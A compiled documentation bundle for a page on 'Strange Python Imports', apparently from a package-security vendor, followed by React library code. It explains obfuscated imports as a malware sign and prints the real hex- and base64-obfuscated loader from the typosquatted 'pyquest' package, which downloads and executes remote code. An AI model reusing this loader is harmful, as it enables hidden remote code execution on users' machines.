"use strict";(self.webpackChunksite=self.webpackChunksite||[]).push([["7902"],{2355:function(e,t,r){r.r(t),r.d(t,{frontMatter:()=>a,default:()=>p,contentTitle:()=>s,assets:()=>c,toc:()=>u,metadata:()=>n});var n=JSON.parse('{"id":"analytics/strange_python_imports","title":"Strange Python Imports","description":"Description","source":"@site/../docs/analytics/strange_python_imports.md","sourceDirName":"analytics","slug":"/analytics/strange_python_imports","permalink":"/analytics/strange_python_imports","draft":false,"unlisted":false,"editUrl":"https://github.com/phylum-dev/documentation/edit/main/docs/analytics/strange_python_imports.md","tags":[],"version":"current","lastUpdatedBy":"Charles Coggins","lastUpdatedAt":1703286129000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"Secrets","permalink":"/analytics/secrets"},"next":{"title":"Suspicious Setup Commands","permalink":"/analytics/suspicious_setup_commands"}}'),o=r(5893),i=r(65);let a={},s="Strange Python Imports",c={},u=[{value:"Description",id:"description",level:2},{value:"Importance",id:"importance",level:2},{value:"Examples",id:"examples",level:2}];function l(e){let t={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.header,{children:(0,o.jsx)(t.h1,{id:"strange-python-imports",children:"Strange Python Imports"})}),"\n",(0,o.jsx)(t.h2,{id:"description",children:"Description"}),"\n",(0,o.jsxs)(t.p,{children:["In Python most packages are imported via ",(0,o.jsx)(t.code,{children:"import"})," or ",(0,o.jsx)(t.code,{children:"from x import y"}),". In fact, this is explicitly called out in the\n",(0,o.jsx)(t.a,{href:"https://peps.python.org/pep-0008/#imports",children:"PEP 8 Style Guide for Python Code"}),". Going out of one's way to import a package\nusing strange or bespoke methods should raise suspicion around the intent of the import."]}),"\n",(0,o.jsxs)(t.p,{children:["For example, the following is functionally similar to ",(0,o.jsx)(t.code,{children:"import os"}),":"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:'# Import our `os` package\nxyz = __import__("\\x6F\\x73")\n\n# Use our imported package\nxyz.system("whoami")\n'})}),"\n",(0,o.jsxs)(t.p,{children:["At first glance it is not clear that the ",(0,o.jsx)(t.code,{children:"os"})," package is being imported. It is highly probable that the developer is\nattempting to muddy the waters around their code to hide some nefarious behaviors."]}),"\n",(0,o.jsx)(t.h2,{id:"importance",children:"Importance"}),"\n",(0,o.jsx)(t.p,{children:"It is difficult to make sense of code that has been obfuscated or written in such a way as to hide certain functionality.\nIt is very likely that code that leverages these strange imports is doing so to hide malicious behavior. You should\nreview any packages that contain these imports and seriously reconsider their use in your project or application."}),"\n",(0,o.jsx)(t.h2,{id:"examples",children:"Examples"}),"\n",(0,o.jsxs)(t.p,{children:["In 2022 several packages were released into the PyPI ecosystem that made use of imports of this kind. ",(0,o.jsx)(t.code,{children:"pyquest"}),", a\ntyposquatted package, had these strange imports tucked away in the middle of an otherwise benign file."]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:" ;__import__('\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73').exec(__import__('\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73').compile(__import__('\\x62\\x61\\x73\\x65\\x36\\x34').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCgpfdHRtcCA9IF9mZmlsZShkZWxldGU9RmFsc2UpCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbignaHR0cHM6Ly96ZXJvdHdvLWJlc3Qtd2FpZnUub25saW5lLzc3ODExMjk4NTc0MzI1MS93YXAvc2hhdGxlZ2F5L2luamVjdG9yMHg5NzQ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','\\x65\\x78\\x65\\x63'))\n"})})]})}function p(e={}){let{wrapper:t}={...(0,i.a)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(l,{...e})}):l(e)}},5251:function(e,t,r){var n=r(7294),o=Symbol.for("react.element"),i=Symbol.for("react.fragment"),a=Object.prototype.hasOwnProperty,s=n.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,c={key:!0,ref:!0,__self:!0,__source:!0};function u(e,t,r){var n,i={},u=null,l=null;for(n in void 0!==r&&(u=""+r),void 0!==t.key&&(u=""+t.key),void 0!==t.ref&&(l=t.ref),t)a.call(t,n)&&!c.hasOwnProperty(n)&&(i[n]=t[n]);if(e&&e.defaultProps)for(n in t=e.defaultProps)void 0===i[n]&&(i[n]=t[n]);return{$$typeof:o,type:e,key:u,ref:l,props:i,_owner:s.current}}t.Fragment=i,t.jsx=u,t.jsxs=u},2408:function(e,t){var r=Symbol.for("react.element"),n=Symbol.for("react.portal"),o=Symbol.for("react.fragment"),i=Symbol.for("react.strict_mode"),a=Symbol.for("react.profiler"),s=Symbol.for("react.provider"),c=Symbol.for("react.context"),u=Symbol.for("react.forward_ref"),l=Symbol.for("react.suspense"),p=Symbol.for("react.memo"),f=Symbol.for("react.lazy"),d=Symbol.iterator,y={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},h=Object.assign,m={};function _(e,t,r){this.props=e,this.context=t,this.refs=m,this.updater=r||y}function x(){}function v(e,t,r){this.props=e,this.context=t,this.refs=m,this.updater=r||y}_.prototype.isReactComponent={},_.prototype.setState=function(e,t){if("object"!=typeof e&&"function"!=typeof e&&null!=e)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")},_.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},x.prototype=_.prototype;var b=v.prototype=new x;b.constructor=v,h(b,_.prototype),b.isPureReactComponent=!0;var g=Array.isArray,S=Object.prototype.hasOwnProperty,k={current:null},j={key:!0,ref:!0,__self:!0,__source:!0};function w(e,t,n){var o,i={},a=null,s=null;if(null!=t)for(o in void 0!==t.ref&&(s=t.ref),void 0!==t.key&&(a=""+t.key),t)S.call(t,o)&&!j.hasOwnProperty(o)&&(i[o]=t[o]);var c=arguments.length-2;if(1===c)i.children=n;else if(1<c){for(var u=Array(c),l=0;l<c;l++)u[l]=arguments[l+2];i.children=u}if(e&&e.defaultProps)for(o in c=e.defaultProps)void 0===i[o]&&(i[o]=c[o]);return{$$typeof:r,type:e,key:a,ref:s,props:i,_owner:k.current}}function I(e){return"object"==typeof e&&null!==e&&e.$$typeof===r}var C=/\/+/g;function E(e,t){var r,n;return"object"==typeof e&&null!==e&&null!=e.key?(r=""+e.key,n={"=":"=0",":":"=2"},"$"+r.replace(/[=:]/g,function(e){return n[e]})):t.toString(36)}function R(e,t,o){if(null==e)return e;var i=[],a=0;return!function e(t,o,i,a,s){var c,u,l,p=typeof t;("undefined"===p||"boolean"===p)&&(t=null);var f=!1;if(null===t)f=!0;else switch(p){case"string":case"number":f=!0;break;case"object":switch(t.$$typeof){case r:case n:f=!0}}if(f)return s=s(f=t),t=""===a?"."+E(f,0):a,g(s)?(i="",null!=t&&(i=t.replace(C,"$&/")+"/"),e(s,o,i,"",function(e){return e})):null!=s&&(I(s)&&(c=s,u=i+(!s.key||f&&f.key===s.key?"":(""+s.key).replace(C,"$&/")+"/")+t,s={$$typeof:r,type:c.type,key:u,ref:c.ref,props:c.props,_owner:c._owner}),o.push(s)),1;if(f=0,a=""===a?".":a+":",g(t))for(var y=0;y<t.length;y++){var h=a+E(p=t[y],y);f+=e(p,o,i,h,s)}else if("function"==typeof(h=null===(l=t)||"object"!=typeof l?null:"function"==typeof(l=d&&l[d]||l["@@iterator"])?l:null))for(t=h.call(t),y=0;!(p=t.next()).done;)h=a+E(p=p.value,y++),f+=e(p,o,i,h,s);else if("object"===p)throw Error("Objects are not valid as a React child (found: "+("[object Object]"===(o=String(t))?"object with keys {"+Object.keys(t).join(", ")+"}":o)+"). If you meant to render a collection of children, use an array instead.");return f}(e,i,"","",function(e){return t.call(o,e,a++)}),i}function Z(e){if(-1===e._status){var t=e._result;(t=t()).then(function(t){(0===e._status||-1===e._status)&&(e._status=1,e._result=t)},function(t){(0===e._status||-1===e._status)&&(e._status=2,e._result=t)}),-1===e._status&&(e._status=0,e._result=t)}if(1===e._status)return e._result.default;throw e._result}var P={current:null},F={transition:null};function $(){throw Error("act(...) is not supported in production builds of React.")}t.Children={map:R,forEach:function(e,t,r){R(e,function(){t.apply(this,arguments)},r)},count:function(e){var t=0;return R(e,function(){t++}),t},toArray:function(e){return R(e,function(e){return e})||[]},only:function(e){if(!I(e))throw Error("React.Children.only expected to receive a single React element child.");return e}},t.Component=_,t.Fragment=o,t.Profiler=a,t.PureComponent=v,t.StrictMode=i,t.Suspense=l,t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED={ReactCurrentDispatcher:P,ReactCurrentBatchConfig:F,ReactCurrentOwner:k},t.act=$,t.cloneElement=function(e,t,n){if(null==e)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var o=h({},e.props),i=e.key,a=e.ref,s=e._owner;if(null!=t){if(void 0!==t.ref&&(a=t.ref,s=k.current),void 0!==t.key&&(i=""+t.key),e.type&&e.type.defaultProps)var c=e.type.defaultProps;for(u in t)S.call(t,u)&&!j.hasOwnProperty(u)&&(o[u]=void 0===t[u]&&void 0!==c?c[u]:t[u])}var u=arguments.length-2;if(1===u)o.children=n;else if(1<u){c=Array(u);for(var l=0;l<u;l++)c[l]=arguments[l+2];o.children=c}return{$$typeof:r,type:e.type,key:i,ref:a,props:o,_owner:s}},t.createContext=function(e){return(e={$$typeof:c,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null}).Provider={$$typeof:s,_context:e},e.Consumer=e},t.createElement=w,t.createFactory=function(e){var t=w.bind(null,e);return t.type=e,t},t.createRef=function(){return{current:null}},t.forwardRef=function(e){return{$$typeof:u,render:e}},t.isValidElement=I,t.lazy=function(e){return{$$typeof:f,_payload:{_status:-1,_result:e},_init:Z}},t.memo=function(e,t){return{$$typeof:p,type:e,compare:void 0===t?null:t}},t.startTransition=function(e){var t=F.transition;F.transition={};try{e()}finally{F.transition=t}},t.unstable_act=$,t.useCallback=function(e,t){return P.current.useCallback(e,t)},t.useContext=function(e){return P.current.useContext(e)},t.useDebugValue=function(){},t.useDeferredValue=function(e){return P.current.useDeferredValue(e)},t.useEffect=function(e,t){return P.current.useEffect(e,t)},t.useId=function(){return P.current.useId()},t.useImperativeHandle=function(e,t,r){return P.current.useImperativeHandle(e,t,r)},t.useInsertionEffect=function(e,t){return P.current.useInsertionEffect(e,t)},t.useLayoutEffect=function(e,t){return P.current.useLayoutEffect(e,t)},t.useMemo=function(e,t){return P.current.useMemo(e,t)},t.useReducer=function(e,t,r){return P.current.useReducer(e,t,r)},t.useRef=function(e){return P.current.useRef(e)},t.useState=function(e){return P.current.useState(e)},t.useSyncExternalStore=function(e,t,r){return P.current.useSyncExternalStore(e,t,r)},t.useTransition=function(){return P.current.useTransition()},t.version="18.3.1"},7294:function(e,t,r){e.exports=r(2408)},5893:function(e,t,r){e.exports=r(5251)},65:function(e,t,r){r.d(t,{Z:()=>s,a:()=>a});var n=r(7294);let o={},i=n.createContext(o);function a(e){let t=n.useContext(i);return n.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function s(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:a(e.components),n.createElement(i.Provider,{value:t},e.children)}}}]);